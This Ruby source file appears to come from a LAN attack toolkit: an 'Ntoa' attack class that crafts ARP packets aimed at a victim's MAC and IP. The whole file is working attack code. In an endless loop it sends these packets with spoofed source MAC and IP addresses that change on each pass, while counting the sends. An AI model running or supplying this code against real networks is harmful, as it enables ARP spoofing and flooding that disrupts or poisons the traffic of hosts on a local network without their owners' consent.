module Ownlan
  module Attack
    class Ntoa < Base

      def process
        @a = 10
        @b = 10
        @c = 10
        @i = 0

        saddr = "00:03:FF:#{@a}:#{@b}:#{@c}"
        daddr = victim_mac
        saddr_ip = "#{source_ip_base}.#{@b}.#{@c}"
        daddr_ip = victim_ip

        crafted_packet = ServiceObjects::CraftArpPacket.new(config, saddr, daddr, saddr_ip, daddr_ip).call

        loop do
          while @a < 100 do
            @b = 10
            @a += 1
            while @b < 100 && @a < 100 do
              @c = 10
              @b += 1
              while @c < 100 && @b < 100 do
                @c += 1

                crafted_packet.eth_saddr     = source_mac(@a, @b, @c)
                crafted_packet.arp_saddr_mac = source_mac(@a, @b, @c)

                crafted_packet.arp_saddr_ip = "#{source_ip_base}.#{(@b - 10) }.#{(@c - 10)}"

                crafted_packet.to_w(config.interface)
                @i += 1
                print "\r The ARP packet has been sent successfully #{@i} times"
                sleep config.delay
              end
            end
          end
        end
      end

      private

      def source_ip_base
        ServiceObjects::NetworkInformation.self_ip.to_s.split('.')[0..1].join('.')
      end

      def source_mac(a=nil, b=nil, c=nil)
        if config.random_mac
          "00:03:FF:#{@a}:#{@b}:#{@c}"
        else
          self_mac
        end
      end
    end
  end
end
